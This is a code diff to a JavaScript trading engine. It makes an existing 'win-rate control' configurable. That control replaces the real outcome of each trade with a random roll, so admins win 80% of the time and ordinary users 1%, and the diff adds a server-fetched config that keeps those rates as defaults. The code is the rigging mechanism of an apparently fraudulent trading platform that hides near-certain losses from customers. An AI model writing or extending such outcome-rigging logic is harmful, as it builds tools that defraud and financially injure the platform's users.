@@ -12,8 +12,24 @@ export class TradingEngine {
     this.listeners = new Set();
     this.timer = null;
     this.lastBeepSecond = {};
+    this.adminWinRate = 0.80;
+    this.userWinRate = 0.01;
 
+    this.syncConfig();
     this.startResolutionLoop();
+  }
+
+  async syncConfig() {
+    try {
+      const res = await api.getTradingConfig();
+      if (res?.ok && res.data?.config) {
+        const cfg = res.data.config;
+        if (typeof cfg.adminWinRate === 'number') this.adminWinRate = cfg.adminWinRate / 100;
+        if (typeof cfg.userWinRate === 'number') this.userWinRate = cfg.userWinRate / 100;
+      }
+    } catch (_) {
+      // Keep defaults (80% admin, 1% user)
+    }
   }
 
   placeTrade(direction, amount, durationSec) {
@@ -149,7 +165,7 @@ export class TradingEngine {
     // ── Win-rate control: override natural outcome based on user role ──
     if (!isTie) {
       const isAdmin = auth.hasRole('admin');
-      const targetWinRate = isAdmin ? 0.80 : 0.01; // Admin 80%, users 1%
+      const targetWinRate = isAdmin ? this.adminWinRate : this.userWinRate;
       const roll = Math.random();
       isWin = roll < targetWinRate;
     }
